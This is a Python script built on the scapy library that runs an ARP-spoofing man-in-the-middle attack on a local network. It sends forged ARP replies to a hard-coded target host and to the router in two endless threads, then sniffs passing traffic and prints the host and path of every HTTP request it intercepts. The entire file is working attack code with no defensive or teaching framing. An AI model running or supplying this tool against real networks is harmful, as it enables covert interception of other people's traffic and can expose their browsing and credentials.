#!/usr/bin/env python
from threading import Thread
import scapy.all as scapy
import time
from scapy.layers.http import HTTPRequest, Raw

ATTACKED_HOST_IP = '192.168.1.33'
# ATTACKED_HOST_MAC = '80:80:80:80:80:80'
ROUTER_IP = '192.168.1.1'
TIMEOUT = 3

def get_mac_addr(ip:str):
    ''' Get mac address by ip '''
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    # print(arp_req)
    # print(broadcast)
    arp_req_broadcast = broadcast/arp_req
    # print(arp_req_broadcast)
    resp_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    # print('resp_list')
    # print(resp_list)
    return resp_list[0][1].hwsrc


def spoof(target_ip:str, spoof_ip:str):
	'''
	Spoof target ip
	Send packet with timeout 3 sec
	'''
	while True:
	    target_mac_addr = get_mac_addr(target_ip)
	    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_addr,
	        psrc=spoof_ip)
	    scapy.send(packet)
	    time.sleep(TIMEOUT)


def show_http(packet):
	'''
	Show http path packet
	'''
	if packet.haslayer(HTTPRequest):
            fields = packet.getlayer('HTTPRequest').fields
            print('Url: {} {}'.format(fields.get('Host'),fields.get('Path')))


def sniff(target_ip: str):
	'''
	Sniff all packets and send it to show_http
	'''
	packets = scapy.sniff(prn=show_http)
        

t1 = Thread(target=spoof, args=(ATTACKED_HOST_IP,ROUTER_IP,))
t2 = Thread(target=spoof, args=(ROUTER_IP,ATTACKED_HOST_IP,))
t1.start()
t2.start()
while True:
    sniff(ATTACKED_HOST_IP)
    time.sleep(2)
